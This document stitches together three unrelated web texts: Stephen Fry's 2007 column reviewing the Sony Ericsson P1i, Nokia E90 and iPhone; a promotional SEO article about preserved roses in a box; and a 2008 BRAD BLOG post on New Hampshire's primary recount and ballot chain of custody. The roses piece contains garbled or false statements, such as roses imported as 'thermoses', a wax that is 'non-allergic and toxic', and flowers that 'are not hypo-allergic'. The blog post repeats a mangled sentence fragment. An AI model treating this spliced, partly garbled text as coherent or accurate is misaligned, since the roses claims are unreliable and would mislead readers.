The miserable nonsense of the browser ( a bad implementation of Opera ) – I mean what on earth is the point of having menu shortcuts that involve using two fingers ?
Typing a “ 1 ” on the keyboard to pull up the URL entry box is fine if you ’ve a numeric keypad , but to have to depress a modifier key too ?
Bah !
AND THERE’S NO OFFLINE MODE !!!!
A SmartPhone that insists you have a SIM card in at all times ?
Just bugger off Sony Ericsson , you ’ve lost my respect .
You ’ve had thousands of pounds out of me in the past .
But stick to student mobile phones called Kxxx with crap silly little jukeboxes on them , SmartPhones are out of your league .
If you ’re going to use UIQ , then take a leaf out of Motorola ’s book and apply it ( in a newer version , Symbian 9.2 , UIQ 3.1 ) to a teen phone , like the excellent new Z8 .
Either that or do the real design work and make a proper SmartPhone , not this insulting halfway house .
As it stands , the P990i is a better phone that this P1i – it has all the same faults , but at least its double action transformer style flip makes it more usable .
“ Please Steve Jobs .
Eat us for breakfast .
Make us look slow - witted , clumsy , unimaginative , grey and idiotic .
Help yourself to the entire market that is n’t Blackberry , we do n’t want it .
We ’d rather make toys for children and knock - off Macbooks for credulous adults .
And somebody might buy the P1i if they want a slow , joyless experience .
You never know .
And anyway Apple cheat by having better products , which is unfair .
We were once Sony. Goodbye cruel world . ”
I could scream with vexation .
This truly is NOT WHAT I WANTED .
I do n’t know how many times I have to say this for you to believe me , but I want iPhone killers .
HTC have n’t done it , Sony Ericsson have rolled over and asked to be kicked and shagged roughly , so what of the Big Finn ?
What of Nokia .
Perhaps they can come up with something ?
Forward the E90 .
Nokia E90 Communicator
I have owned at least one of every Communicator since the brand arrived in the shape of the 9000 in … well it must be over ten years ago because I had one when I was making the film Wilde in 1996 .
I remember being upbraided for having it poke out of the top of my velvet jacket in one of the courtroom scenes …
What a breakthrough it was ( the phone , not the film ) .
Black and white originally , but with some very advanced features for the time .
I was recording silly high quality ring tones at a time when everyone else was monotimbral , monophonic and tinkly .
It was big , but it was powerful and a wonder to use .
The 9 series line ( running an operating system called GEOS ) was slowly upgraded with the 9110 and I think another ( the 9200 ? ) until the more modern , Symbian 9500 , and 9300/9300i , the latter two without camera , but smaller and neater .
And today ( almost literally today ) comes the E90 Communicator , a brick dressed in Symbian S60 cothes .
The “ E ” designation is revealing .
Nokia have had a dismal few years in which hardware design has faltered appallingly ( my dear , have you seen the E61 and E61i ?
possibly the ugliest objects ever designed by man .
Simply disgusting to look upon , handle or use ) but another arm seems to have branched out with better design .
The N95 is beautiful , really lovely and very powerful .
Shame that it uses a standard telephone keypad , the N series are really multimedia toys for adolescents , aimed I would guess at the Sony Ericsson K and W series .
And then there is the wholly gorgeous 8600 Luna , an indulgent chocolate - box of a mobile phone .
As they say in Australia , “ ideal for gift - giving interstate or overseas . ”
The E series models use an especially clunky and unsightly family of icons ( rather like Vodafone ’s dreadful offering .
If you want to uglify a Blackberry 8100 or 8800 , a hard thing to do , use the proprietary V’fone theme set .
Yuk .
They impose it on all their badged phones and it smells ) .
In the E61s which are so fuck - off ugly that you stretch your eyes and wonder at who on earth is running Nokia , the addition of an ugly GUI is enough to tip the whole thing over the edge .
Not just an repellent concrete house , but one filled with disgusting furniture .
In the case of the E90 Communicator , you have a rather pleasing house ( I know , I know , beauty is in the eye of the beholder , de gustibus etc. but take it from Mother , the E90 is pleasing in exactly the way the E61 is n’t ) which somehow exonerates the UI .
The E90 is thick - as - a - brick , expensive ( ex-contract as an offline purchase it ’s well over £ 600 .
Or maybe they just saw me coming ) and yet …
I LIKE IT !
I really , really do .
I ca n’t explain why .
It ’s the same UI , pointlessly ( at first glance ) doubled on both screens .
No SMS threading ( for God ’s sake ! )
Yet something about the layout and something about the feel ( the actual object is really strong and has a satisfyingly robust heft ) pleases me and draws me to it .
Functionally it works a lot more easily than the UIQ devices , on which I have so reluctantly been forced to spit .
It ’s hopeless with a Mac , but with a little smart to -ing and fro-ing you can transfer address books from a Mac - synced SmartPhone to the Communicator via Bluetooth , or you can bite the bullet and run the Nokia PC Suite on a PC , virtual or otherwise .
( If you ’re going virtual , then do upgrade to the latest version of Parallels – they are eventually starting to get USB connections right ) .
God knows this is NO iPhone killer .
But unlike the iPhone it does have something approaching a manageable filing system , Bluetooth that works , GPS , quick text entry via a keyboard ( Steve Jobs here you are wrong , much as it grieves me to say it – more below ) , the ability to save and move around attachments , to download applications and to create documents .
The battery life is hours better than on a UIQ Sony Ericsson , the response is quicker than a UIQ Sony Ericsson too ( but then the response you get from a dead walrus is better than that of a UIQ Sony Ericsson ) and quicker than that of an iPhone in some arenas .
All in all a Good Product .
I ’ve been using it solidly for two days now ( in harness with an iPhone and a BB 8800 ) and it has that indefinable quality that marks out a device one knows one could live with .
The ancient Nokia virtues from way back are there – the power button that when swiftly depressed offers profile changes as well as switch - off , the network controls , auto redialing , straightforward navigation and good old infrared ( bless ) .
To this have been added the 3.2MP camera , a videocalling second camera , amusing 3D ringtones ( the only concession to teenage silliness ) good WiFi ( though still only 802.11 b and g ) , USB 2.0 and Bluetooth 2.0 .
Yes , I like it , but – as I say – iPhone killer it is n’t .
Which brings us on to the big beast .
my Phone • fryPhone • iPhone
I ’m not here to review the iPhone .
Enough to say that in Britain at the moment , this extraordinary device remains one hell of a luxury .
I have a full working model because , as a green carded US resident alien , I have an American bank account and billing address , without which AT&T authorisation would be impossible .
It ’s not easy after that to persuade them to allow you an international roaming account either .
Until the UK release one is functionally an American in Europe roaming expensively on inferior networks .
I say inferior because the UK EDGE networks are a great deal slower than the US .
I have no idea why , it ’s just so .
My friends at Apple say there is much to be done to ready the iPhone for its projected late 2007 release over here .
Perhaps it will be delayed .
You see me above in my trailer , between scenes , making eyes at the device .
To get EDGE in Norfolk is feat enough , believe me .
I hereby offer a few remarks – to show that I am not in Apple ’s fee , and do have a totally independent way of looking at these things .
There are issues .
Problems .
They ’ve been gone over before but I ’ll outline my sense of what needs looking at .
Server side apps only .
No , no , no , no , no .
This is NOT good .
It ’s one thing to want to keep the proprietary system closed , but to present a device sealed in digital Araldite is a Bad Idea .
An Ubuntu flavoured Linux for mobiles is in the works , and you do n’t get more open source than that .
Damn it , there ’s Linux for the Palm available these days .
Even Microsoft are making gestures towards client - side open source apps .
Only amateurs are going to want to create server side apps for the iPhone .
In case you do n’t know what I mean , I should explain that the only third party programs available for the iPhone are run out of Safari ( the resident browser ) pages .
You ca n’t download squat .
Enthusiastic individuals will come up with WorldMate or Splash Photo or other top ten smartphone app lookie - likies but until Apple introduces a Java implementation or allows the bonnet to be unwelded and lifted up , the device will remain a fraction of what it should be .
Text entry .
I ’m sorry Steve , but physical keyboards are okay .
They ’re fine .
When in your iPhone introductory keynote late last year you dissed the stylus and keyboard , you may have noticed a deafening silence as tumbleweed and sage - brush whizzed through the hall .
It is certainly true that the virtual kb used in the iPhone gets better the more you use it .
It is also true that the glossary autocorrect system is immensely impressive .
But I challenge anyone to type an email as fast on an iPhone than I can on a BB or Treo .
I assure you it ca n’t be done .
I ’m pretty quick with an iPhone now , but nonetheless text entry just is n’t as satisfying as everything else about the device .
It ’s an example perhaps of ideology overcoming practicality , as in the early days of the single click mouse .
Do n’t be stubborn about this Steve , you know I ’m right , as in their heart of hearts do the guys at Cupertino .
Hence the lack of Quicktime movies on the Apple site showing happy users typing proper length emails and texts .
Why else is the only footage of text entry hurried and very much on the short side ?
Because they know … they know perfectly well it ’s a drawback .
Bluetooth ?
It might as well not be there .
D’loadable ringtones ?
C’mon .
Mail attachments ?
See and touch but ca n’t download ?
No , no , no !
And yes , it should probably be 3G .
A power consumption issue mostly , no doubt , but one hopes it ’ll be addressed over the next few digital years .
Three months , by my reckoning is a digital year .
Or to put it another way , a human year is four digital years .
But that ’s about it .
Everything else in the iPhone lives up to , even surpasses the hype .
Another triumph for Jonathan Ive and his design team , Apple have made a wholly desirable and beautiful object .
Only a cross and silly person would pretend to be unimpressed or make claims of parity about their O2 xda Trion or similar lumpen beast .
My guess is that iPhone 3 is going to be closer to the Dynabook than anyone dreamed possible .
It ’s a small wait by anybody ’s standards .
Except mine .
Except the standards of the impatient early adopter .
I might as well end with a wish list .
Someone to take the UIQ platform and give a bolt of lighting .
The Palm OS to receive ditto .
The iPhone to open and expand .
D’loadable ringtones ?
C’mon , Apple , you can do better than the sop you ’ve thrown us with the latest iTunes release .
You would n’t want to look greedy would you ?
For me it ’s an addiction .
Swapping SIMS , syncing , testing , probing , playing .
I ca n’t pretend I ’ve any higher purpose .
What cars are to some , SmartPhones are to me – much , much more than just a functional tool .
We live in the age of these devices .
It should be the age of the greatest imaginative drive , flair and creativity in the digital arena .
I am disappointed that not everyone in the industry sees it that way .
As the General Confession in the Book of Common Prayer has it , “ I have followed too much the devices and desires of my own heart . ”
Amen . © Stephen Fry 2007

We can all agree with the fact that roses in a box are simply attractive .
If you are given a bouquet of roses in a box by someone your heart would surely melt .
Occasions such as weddings , anniversaries , birthdays just to mention but a few become more meaningful when there are flowers such as roses .
All over the globe , people have embraced the technique of expressing their feelings to their loved ones through roses .
This becomes simpler because there are different types of roses that allow us to express ourselves in various colorful ways .
to visit roses that last a year
For anyone who has purchased roses in their life have probably experienced the roses drooping behavior .
When you buy a fresh rose for someone in a vase , you will definitely find the stems have drooped over the next day .
Something that makes you sad about it is the fact they are not cheap .
So , you might end up losing your fifty dollars or even more on something that will last for less than a day .
This drooping behavior of roses does n’t only look horrible but it ends up ruining the positive image that was intended with the image of drooping and dying rose .
What would this portray especially for someone who was giving out a rose to express their love to someone ?
Sorry to say but this is not a healthy and a positive message at all .
visit Premium Roses for more info .
The best solution to eliminate this kind of roses is to opt for roses that can last a year or even more .
There are simple , high - quality silk and black roses in a box that can serve you better and lasts for a whopping 12 months .
In fact , you will find a hundred of options in color , sizes , and styles that you can choose from .
So you will not be limited to only a dozen of red roses in a box .
The cost for the roses that can last a year or even more is the same as the dozen of the real roses and they will not wilt at all .
In this piece , we are going to look at venus et fleur roses in a box that can last a year or even and their benefits .
About flowers that last a year
Venus Et Fleur roses in a box are real roses in a box that can last a year when you give them proper maintenance care .
Usually , these forever roses are cut at their perfect and peak state .
Then they are treated with a proprietary solution before they are taken through a color pigmentation process to transform them into a lasting rose retaining their biological structure and freshness .
The outcome of all the processes that they are taken through is that the roses finally continue to feel , look , and even give a scent just like the real roses .
The only difference between the venus et fleur roses in a box with the other roses is that they will maintain their color and integrity for a year or even more .
Expensive Roses
Venus et fleur is a type of a rose that comes in different styles , sizes , and colors of different roses variations .
If you want a black rose , red roses or any other type of Preserved roses in a box you will definitely find a style variation that will suit your requirements as well as color and size .
These roses can stay soft and fresh for a long period of time because of the process and the formula that has been developed by the company that manufactures it You find that the company starts by importing thermoses from Ecuador .
Typically , they use red and black roses , since these two colors are the most preferred especially for wedding and anniversary .
Also , their farm suppliers usually grow the above - mentioned fancy roses .
When the roses arrive the company then cut the peak state of the roses and then use non-allergic and toxic wax formula that resembles silica to come up with the final product .
After they have successfully completed the first step of processing these roses , the company then soaks the roses in a color tank with their dye .
The dye they use can range from pure rich red , black to more variations that are playful and attractive such as metallic and rainbow dipped roses .
When the process of developing the roses is completed and every step of the formula that is used is completed the roses are packed in Parisian boxes .
You need to understand that when you buy these roses the only maintenance that you will need to give them is dusting them lightly time after time .
Although , the company usually recommends the roses that last 1 year to be kept away from excessive humidity , heat , and sunlight .
The scent that roses in a box have will last anywhere between two to three months before it wears out completely .
Credit to the uniform design and easier maintenance that they demand , the roses in a box have become very popular with anniversary , weddings and hotels .
Benefits of flowers box that can last a year
1 . They are cost effective
You find that roses become a very expensive commodity when they are cut , processed arranged in a box or a bouquet .
While black roses and silk flowers tend to have different prices , you will find that they usually cost as much as half of the amount that you pay for flowering plants .
The lower the price of roses is , the less durable the roses are and less realistic they will look and feel .
You will find that most of the time rose prices usually vary depending on the intricate and details that the roses have , as these planning are usually of high quality .
If you are planning to hold an anniversary anytime soon it is important you consider hiring an expert to do the centerpieces and other arrangements for you .
Get a picture of what you want your next anniversary you want to look like and make arrangements to purchase roses that can last a year in advance to embrace your occasion .
Ordering early is important in that when you are not satisfied with the arrangement that you make during your first time , you will have some of the wiggles to try out and test other various options .
Another cost - effective positive point about roses that can last a year is that because they will last for a long duration of time , you will have a chance to switch the arrangement that you make on the beginning as often as you wish .

2 . They do not expire
Roses in a box that can last for a year are sturdy and durable , unlike the fresh roses that you buy in your local store , which can tear , wilt or fall apart even before you finish descending the aisle .
Your rose in a box can be stored safely as a memento from the day that you hold your occasion for a year or more .
Long lasting roses are also important for the home décor as well .
Fresh and natural roses are just good for about a day or so and they are past their prime lifetime .
When you take care and store your long lasting roses , your rose ’s arrangement can last for a very long duration of time .
You find that because of the long lifespan that roses have , they have been used by different people for entertainment purposes as well .
For instance , in movie filming , it takes about three or more weeks to shoot a scene and if such a scene need roses , it becomes a bit expensive to replace the displays especially if the roses used start wilting .
This is why roses that last for a long duration of time are preferred most of the time especially because of the effects that the hot stage lights bring .

3. Eco-friendly
This goes without saying that roses that can last for a year are more environmental friendly in comparison to the fresh flowers and other real counterparts .
This has to do with how they are disposed of after usage as well as how often this would happen .
To bring this out clearly , let ’s assume that ten people buys a bunch of fresh roses each and another ten buys the billion roses each that lasts for about a year .
You will find that after two days or so the ten people who bought the fresh roses from the local stores will end up disposing them off after they wilt , tear and fall apart .
Consequently , if the roses are disposed of without enough care they will end up polluting the environment leaving heaps of dirt that produce unwanted gases .
They will also leave a negative carbon footprint that is not environmental friendly .
Also , if the dumping cycle continues it will contribute to unwanted soil contamination and it will end up causing health problems to the field workers .
Scientifically , long lasting roses are eco-friendly because they do n’t get dumped anyhow like we have seen their counterparts are .
4 . They not affected by climate
Roses that last for a year or are not affected by climate change at all .
In short , this means that you will not have to worry about your roses wilting in summer or getting dry during the winter .
These everlasting rose are very important especially if you are planning to hold your anniversary occasion in a tropical climate because they wo n’t let you down .
Basically , you can hold your occasion according to your arrangements no matter the climate without having to worry about your roses .
5 . Easy to transport
Roses in a box are easy to transport no matter where you are planning to shift to .
More so , your roses will not wear , tear apart or wilt because of the temperature change during your movement .
Roses that can last for a year can be easily put in a box during the movement from one place to another .
Roses in a box that can last a year are also very resistant , so their shape and color will not deteriorate , and their blossoms can also be restyled once you get to the place that you are moving to .
6 . Easy to maintain
Roses in a box usually require very little almost no attention at all .
You will not be bothered with under or over watering the rose arrangements or the constant replacement of the soil water for your flowers to flourish .
Petals will not require any kind of rearranging neither will the stems need any re-cutting to give them the required shape .
When you purchase these roses that can last for a year or more they will stay , look and feel as beautiful as you purchased them .
Unlike the fresh roses that you buy in the local flowers store that lasts for about two days , roses in a box that can last for a year will not need any replacement of the roses when you place them somewhere strategically in your house .
Moreover , roses in a box that can last a year come when they fully bloomed , so you will not have to wait and take time for your roses to open up fully .
luxury roses
7 . They are not hypo-allergic
Allergies can be a challenge to some of us , especially for those of us who are sensitive to pollen grains .
With forever rose , you will have an option of placing them almost everywhere or anywhere and you will get zero complains of nose tickling .
These kind of roses are also a great deal for those of us who cannot tolerate the aroma of the fresh roses and the highly sensitive odors that is produced by fresh flowers .
Essentially , roses that comes in a box with the ability to last for a year do n’t have odors and smells that will be a nuisance to the people around who are highly sensitive to smell and pollen .
To wrap up the loose ends , it is worth to mention that forever flowers are an integral part when it comes to decorating be it an anniversary occasion , a bridal bouquet , a centerpiece or a perhaps just a bunch of roses in the counter of your kitchen .
So , during your next floral arrangement ensure you get roses in a box that will last for an year or even more .
Most of the time when people are buying roses they are usually after beauty and elegance in their floral plans , so they prefer fresh flowers .
However , roses in a box that can last a year can perhaps be the best realistic and beautiful choice .

And Other Recent News from the Election Contests in New Hampshire ...
Brad Friedman Byon 1/22/2008 , 3:01 am PT
Now that we 're finally back at The BRAD BLOG World News Headquarters in Los Angeles ( for a few days at least ) and have shaken off our road buzz ( for now ) , gotten through the latest Sibel Edmonds blockbusters ( until the next shoe drops ) and have overcome last Friday 's maddening 24 hour Internet outage , we 've got some catching up to do on New Hampshire 's continuing mess of a " recount . "
Luckily for us , as we 've been traveling for the last few days , and pulling off other related miracles , the hand counters in Concord took a break as of last Friday for a long weekend , which includes today 's Martin Luther King Day holiday .
As we all know , MLK would have hated the idea of anybody actually counting votes on his holiday , so we 're glad the folks from the NH SoS office decided to let the ballots sit around and cool off in the darkness for three long days in a vault somewhere ( maybe ) .
The counting , which has so far covered just a small portion of all of the ballots , will resume on Tuesday .
So ... From the latest hand count numbers , to the latest media coverage , to the latest reports from Election Integrity experts on the ground --- including one amazing photo essay illustrating New Hampshire 's " chain of custody " protocol for its ballots , 80 % of which have never been counted or examined by a single human being ( that we know of ) --- let 's get caught up a bit .
Fasten your seatbelts and make sure your Pinto has a full tank of gas ...
The Press Coverage ...
We 've got a continuing mixed bag .
The worst of the coverage , ironically enough , is still being irresponsibly hammered home by the supposedly - Progressive blogosphere .
We 've already covered some of the notoriously bad , dangerous , irresponsible , and self - destructive coverage from some of the gate keepers ( not crashers ) at Daily Kos and elsewhere , but a new contestant in the anonymous irresponsibility sweepstakes , calling him / herself " Elwood P. Dowd " at dKos and elsewhere , has jumped in to the disinfo game .
As usual , without any evidence to back up his / her silly claims .
We 've sent dear " Elwood " an email to counter his / her nonsense .
To date , he / she has not bothered to post it , though late tonight , we 've noticed a sad little " clarification . "
( More detiails , and our complete letter to " Elwood " , in response to the item linked above , at the end of this item . )
For those whose information , thus far , on the NH Election Contests consists only of the misinformation being delivered by the crack journalistic skills of " Elwood P. Dowd " and company , a reminder which we ask you to read carefully , before misreporting it elsewhere anyway :
counting the paper ballots by hand , it would be impossible to discover the hack .
( The concern here is that 80 % of New Hampshire 's paper ballots , until now , have never been counted or verified in any way , shape or form by any human being .
Instead , they were counted on the exact same Diebold optical - scan machines shown to be error - prone and hackable in study after study , and even as seen LIVE , in HBO 's Emmy - nominated documentary Hacking Democracy , flipping a mock election in such a way that , without actuallythe paper ballots by hand , it would be impossible to discover the hack .
( See the live hack for yourself here .)
No serious Election Integrity expert , to our knowledge , has charged fraud , or even error by anybody , at this time ( other than references to the many tabulation errors already discovered during the the post- election contest hand counts now under way in Concord ) .
The BRAD BLOG has simply and , we believe , responsibly , called for the ballots of 80 % of the voters in New Hampshire to actually be counted , and for that count to be properly reconciled and accounted for .
Okay , then ... Beyond the " Progressive " bloggers , we find ...
• A decent and responsibly cautious story on the front page of last Friday 's Concord Monitor
After quoting from some of the early contest coverage from your friendly neighborhood BRAD BLOG , in which we quoted the Voting Rights expert / attorney John Bonifaz on his concerns about transparency issues discovered when he visited Concord and spoke to NH SoS Bill Gardner last week , the Monitor quotes the SoS saying in response :
" If this is n't transparent . . . "
Gardner said , raising his eyebrows and gesturing to the tables of counters and observers .
" What could we do to make it more transparent ! "
For one , Mr. Gardner , you could allow the Kucinich campaign to count the number of unvoted ballots , as they 've requested .
You could also tell America where the Diebold optical - scan memory cards used in the election are , and allow Kucinich 's team ( and everyone else ) to inspect them as well .
All such materials are required , by federal law , to be retained for 22 months after an election , and both are needed in order to reconcile the hand - count .
It does n't do a hell of a lot of good to count ballots if there is no way to know that they are the actual ballots as cast during the election .
Given the startling photographs detailing New Hampshire 's " chain of custody " published over the weekend ( keep reading ) , there is certainly reason to be concerned .
We spoke with Manny Krasner , the attorney in New Hampshire overseeing the hand count on behalf of Team Kucinich , and confirmed that he has a number of concerns about the process so far .
That , despite the following section from the Monitor :
Manny Krasner , a bushy - mustached " country lawyer " from Farmington who was tracking the recount for Kucinich , said they had n't seen anything suspicious .
Krasner disputes the Monitor 's take on his comments .
" I was talking about what was going on inside of the four square walls of the counting room , " Krasner told us , before detailing Gardner 's refusal to allow the counting of unvoted ballots .
" We requested that unvoted ballots be counted , but they 're not being counted , " he said .
He reports that SoS Gardner 's explanation for disallowing the proper reconciliation of ballots during the hand count was " the New Hampshire recount statute , [ says ] that you count the ballots that were counted in the first place " as opposed to the unvoted ballots .
Krasner tells us that both Asst. SoS Bud Fitch , as well as the Asst. AG agreed with Gardner 's decision .
The statute in question , " CHAPTER 660 : POST - ELECTION PROCEDURE - State General Election Recounts " as posted at the NH SoS website offers evidence to support the ruling by Gardner , where it says , in Section 5 discussing " Conduct of Recount , " that " the ballots cast for such office shall be counted . "
Everywhere else in the statute , only " ballots , " without specificity , are discussed , with the following exception .
Section 16 details " General Provisions for Recounts " and refers to the " Disposal of Ballots , " offering an exemption from NH's RSA 91 - A , which relates to how other public records shall be disposed of [ emphasis added ] :
II .
Ballots , including cast , cancelled , and uncast ballots and successfully challenged absentee ballots still contained in their envelopes , prepared or preserved in accordance with the election laws shall be exempt from the provisions of RSA 91 - A .
This exemption shall apply to any ballots or absentee voter affidavit envelopes prepared for or used in any election conducted by the state or any political subdivision , including federal elections .
In other words , while most of the rest of the statute governing " State General Election Recounts " refers to ballots in general , without specificity , the provision above refers specifically to the preservation of " cast , cancelled , and uncast ballots . "
What those uncast ballots are ever to be used for , since the SoS wo n't allow them to be counted to make sure that they are all there and in good order ( as opposed to having being used for some nefarious purpose ) is unknown .
As well , David Bright , a senior Kucinich representative who has been in the counting room serving as an observer over several days last week , tells
The BRAD BLOG tonight that in addition to the refusal to allow for the counting of uncast / unvoted ballots , they have also not been allowed to review the poll books , so they have no way of knowing how many actually signed in and cast ballots on Election Day .
" We have no indication of how many voters actually voted .
No check lists .
No list of who signed into the poll books , " says Bright .
These are no small issues , given the troubling state in which ballots are arriving in Concord .
For more on that , please keep reading .
" There are a lot of other issues here , " said Krasner , who has worked for Kucinich for years in the Granite State .
" I thought we had a pretty air - tight system here in New Hampshire , and now I 'm beginning to see a lot things that need to be tightened up , rather significantly . "
What the Kucinich camp intends to do about " tightening " things up during the counting remains unclear at this hour .
Though Krasner added , " We 're taking notes , we will have proposals for legislation . "
We 're hopeful that they will do far more than that .
Indications are that they might .
But we 'll see what they actually do as the count continues to move forward .
• Pollster Mark Blumenthal rings in , and though we 've had issues with his far - too - conservative , far - too - forgiving coverage in the past on a number of items --- including his tendency to believe that sophisticated , transparent , time - tested polling methodology is far more suspect than results gathered by secretly programmed , wholly untested counting devices shown to be frequently inaccurate , prone to out - and - out failure , and exceedingly vulnerable to undetectable tampering --- he joins Salon 's Farhad Manjoo ( who has a similarly apologistic track record ) in agreeing with us that paper ballots in New Hampshire , and elsewhere , where they still exist , need to be counted .
We 'll take it .
Blumenthal quotes from Manjoo's coverage [ emphasis added for " Elwood " and friends ] ...
I had a long discussion with Brad Friedman , who runs the election - reform news Web site Over and over , he said , " My biggest concern here is that 80 percent of the vote is uncounted by any human being . "
His request is simple and straightforward : " Why not count the damn votes ? "
Last night , who runs the election - reform news Web site Brad Blog He 's right .
Why not count the votes ?
...
[ A] fter every election , officials should randomly count some number of ballots to double - check the machines ' results .
It is amazing that this is not a standard procedure across the country ; it is a disgrace that election officials are n't rushing to implement such procedures now .
Blumenthal then adds : " I could n't agree more . "
As well , he offers a number of misleading points in other areas , as we see it , but we can save those for another day , as this article will be long enough already , and we 're delighted to see that he's at least partially beginning to speak out for verified elections .
And while Manjoo was refreshingly correct on a number of points made in his Salon piece , including just how hackable the Diebold machines used in New Hampshire are , and that " Proving that theft did n't occur should be a routine part of elections --- all elections , all the time , " he seems to have been wrong on the data analysis he used to suggest that the various concerns about the NH results , regarded widely as anomalous , and certainly a surprise to just about everybody , " do n't hold water . "
According to analysts at the Election Defense Alliance ( EDA ) , who combed over Manjoo 's analysis , it seems he was working from inaccurate data , as posted early on after the election by a well - meaning Ron Paul supporter .
As compared to the actual results as posted by the NH SoS , it seems that it 's Manjoo 's conclusions that " do n't hold water " instead .
At least according to the smarter - than - us folks on the EDA analysis team .
The EDA folks notified Manjoo almost immediately after his article was published a good 10 days ago .
No correction or retraction has been posted to date .
Though we 've seen plenty of people point to the article in attempts to quash the notion that there are concerns about NH 's election results .
We hope the editors at Salon will take appropriate action immediately to correct the egregious errors .
• Two editorials from local papers are of note .
One because they got at least one point correct .
The other , because it's so demonstrably embarrassing for them .
The Union Leader points out in Monday 's paper that " REP .
Dennis Kucinich was right to request --- and pay for --- a recount of the ballots in the Democratic presidential primary . "
They then go on to blow it , by referring to questions about " voter fraud " ( versus election fraud , or even just tabulation error --- the voters are still doing fine , so please leave them alone ! ) ; " conspiracy theories , " which no serious EI advocate has charged at this time , and ; that it 's appropriate for Kucinich , not NH , to have to pay for such a hand count , instead of the state , which has been delinquent in its job and responsibility to , as Manjoo averred , " prove that theft did n't occur " as a " routine part of elections --- all elections , all the time . "
The Union Leader then concludes its brief , unbylined editorial with :
Whatever the recount 's results , Gardner has opened the process to observers so there can be no question about the integrity of the count .
Doubters on both sides should let this settle the issue .
If they question Gardner 's integrity , then we 'll know for sure not to trust anything else they have to say .
While nobody seems to be questioning " Gardner 's integrity " at this time , it 's foolish to believe " there can be no question about the integrity of the count " given Gardner 's refusal to allow the counting of unvoted ballots , failure to supply poll books for validation of the number of actual voters , and his complete disregard for the whereabouts of important election media , such as the sensitive Diebold voting machine memory cards which are still " missing . "
The Eagle - Tribune , on the other hand , just make complete idiots of themselves with their editorial today --- on Martin Luther King Day , of all days --- by suggesting that " It does n't matter " that " the machines did not count every vote . "
" A few hundred votes either way " is no prob for the E-T ; Kucinich is blasted for " the damage he is doing to the country " by asking that ballots actually be counted ; " the results will not change an iota " ( guess it depends on your definition of " iota " ) ; and that the " whole idea that it will is a fallacy that is destructive to Americans ' confidence in the democratic process . "
Wow ... talk about " destructive to Americans ' confidence in the democratic process . "
Keep up the horrible work , E-T !
They also blame a " failure of people to make the minimum effort required of citizens of a democracy " for ballots that went uncounted by the Diebold machines .
We guess those 550 ballots that could n't be counted by the Diebold machines in Stratham , according to public records requests , because they could n't read the ink on the ballots , were also the fault of those lazy citizens .
Yes , believe it or not , the Eagle - Tribune is an actual newspaper , as opposed to The Onion .
• In regard to our article last Thursday , just before we were knocked off line for a bit , reporting " huge disparities " in the tallies of Manchester 's Ward 5 , where the counts were discovered to be anywhere from 40 to 60 votes off for each of the leading candidates in just that one precinct alone , the Union Leader reported on Friday that :
The widest variations so far were in Manchester 's Ward 5 .
Vote counters there mistakenly transposed write - in votes for vice president as votes for presidential candidate .
As a result , all major candidates lost votes .
Kucinich lost three in the ward and has a total of 20 votes there .
Hillary Clinton lost 64 with a new total of 619 ; John Edwards lost 38 and has 217 votes ; Barack Obama lost 39 and has 365 , and Bill Richardson lost seven , leaving him 39 .
As we noted in our update to the original item , pointing to the reporting above , we 've been unable to confirm that as the cause of the disparity one way or another , but we 're happy to see that the problem was discovered , thanks to Kucinich 's hand count .
Those errors , and likely many more to come , would have stood in for the official results , because New Hampshire did n't bother to verify any of them .
The Numbers ...
But never mind the disinfo , misinfo , and ridiculous opinion out there .
What about " the numbers " ?
The proof is in the pudding after all .
But proof of what ?
That the ballots where never counted , as we 've argued correctly , while being much maligned for such an argument from the beginning ?
That much is stone cold accurate , despite the yutzes and " Elwood 's " of the world .
So , in any case , what else have we learned since we last we reported on the results slowly dribbling out of the hand count process in Concord ?
In addition to the Diebold miscounts discovered across almost all of the Democratic candidates , in almost all of the wards as counting began last week , and the huge mistallies in Manchester 's Ward 5 , discovered on Thursday , Friday 's counting revealed still more large mistallies in Nashua ward 5 , according to the NH SoS website 's " recount " results page ( which is incredibly poorly designed , btw . )
In Nashua 5 , there were very notable discrepancies , as follows ...
NASHUA , WARD 5 Diebold
Result Hand
Tally Discrepancy Total
Votes %
Error CLINTON 1,030 959 - 71 7.40 EDWARDS 405 377 - 28 7.42 OBAMA 673 678 +5 0.73
Beyond the candidates mentioned above , in Nashua , Ward 5 , Richardson lost 3 votes ( out of 72 , as tallied by Diebold originally ) and Biden lost 1 ( out of 9 ) .
Everyone else , including Kucinich , remained exactly the same after the hand count in that one precinct .
Note :
The above numbers are from Nashua , Ward 5 .
As opposed to Manchester , Ward 5 , which we reported on last Thursday , with some consternation , after enormous disparities were revealed by the post-election hand count in that precinct as well .
As mentioned previously , other folks , smarter with numbers than we are , and able to study them much more closely , are following the results as they come in .
There 's still a long way to go , so we 'll leave it there for now .
But since the NH SoS results page is so impossible to read , we offer you this more illustrative version of SoS 's numbers so far , in aerial overview , for the three leading candidates , as painstakingly compiled by Bill W. of Crooks & Liars .
This graphic shows mistallies found for just the three leading candidates , though it does n't specify which are hand count and which are Diebold precincts .
Still , it offers a good overview of the number of mistallies so far discovered , now that folks are actually bothering to check them by hand in New Hampshire ...
( Butch & Hoppy ) + Post - It Notes = NH's Chain of Custody
Lastly ( or almost ) for now , is this extraordinary photo essay , as posted over the weekend by Bev Harris at BlackBoxVoting.org .
We 're running it in full here , with her permission , because we believe it 's so important for you to see for yourself .
The photos and comments are all hers , culled from her time on the ground in New Hampshire where she , and a number of other volunteer Election Integrity advocates and experts , are documenting some extraordinary stuff on video .
She 's got much more on all of this , and we encourage you to keep a close eye on the work she 's posting at BlackBoxVoting.org as the counting continues .
But for now , meet Butch , Hoppy , and New Hampshire 's " chain of custody " ...
" Butch " and " Hoppy " " Butch " is on the left , " Hoppy " is on the right .
This is the van that " Butch " and " Hoppy " drive .
These two men pick up all the ballots in New Hampshire from more than 230 locations and bring them to one central location for the recount .
---------------------
They are followed by a single state trooper .
" Butch " has a real name : Armand Dubois .
He does n't like to be photographed and in video after video , he ducks out of the shots .
He wears a baseball cap and dark glasses .
At one point he said " you 're taking a picture of me ? "
Perhaps he 's shy , but this is an evaluation of chain of custody , which includes knowing the names and background for people who ride around the state inside a van containing the ballots for the presidential primary election .
-------------------
According to " Butch " , the real name for " Hoppy " is Peter , but we do not yet know the last name .
" Hoppy " is not camera shy , but we would like to know his real name and background .
( Do not post personal or speculative information here .
It will be removed .
E-mail privately to crew@blackboxvoting.org ) " Hoppy " aka " Peter " ------------------
Ballots are contained in a variety of cardboard boxes , with a few metal boxes thrown in from certain parts of Manchester .
The New Hampshire secretary of state 's office , which provides the labels for the boxes and provides the ballots for all the towns , claims they leave the decision up to the towns as to how to secure their ballots .
